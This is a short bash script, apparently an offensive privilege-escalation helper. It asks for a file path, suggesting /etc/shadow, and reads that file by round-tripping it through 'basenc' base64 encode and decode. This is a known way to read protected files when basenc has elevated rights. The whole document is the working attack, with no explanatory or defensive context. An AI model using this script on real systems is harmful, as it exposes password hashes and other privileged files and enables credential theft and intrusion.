#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
basenc --base64 $filepath | basenc -d --base64
